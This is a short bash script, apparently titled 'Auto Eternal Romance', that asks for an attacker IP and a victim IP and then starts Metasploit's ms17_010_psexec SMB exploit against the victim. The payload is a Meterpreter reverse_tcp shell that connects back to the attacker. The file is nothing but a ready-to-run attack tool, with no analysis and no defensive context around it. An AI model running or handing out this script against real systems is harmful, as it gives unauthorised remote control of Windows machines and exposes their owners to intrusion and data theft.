#!/bin/bash
ATTACKER=0.0.0.0
VICTIM=0.0.0.0
echo "  ,d88b.d88b,"
echo -e "  88888888888   \e[91mAuto\e[0m"
echo -e "  'Y8888888Y'      \e[91mEternal\e[0m"
echo -e "    'Y888Y'           \e[91mRomance\e[0m"
echo "      'Y'"
echo ""
echo -e "\e[91m~Who are you?~\e[0m"
echo "Enter this machine's IP:"
read ATTACKER
echo ""
echo -e "\e[91m~Who are they?~\e[0m"
echo "Enter the victim's IP:"
read VICTIM
echo ""
msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec;set rhosts $VICTIM;set payload windows/x64/meterpreter/reverse_tcp;set lhost $ATTACKER;run;"
echo -e "\e[91m~ <3 ~\e[0m"


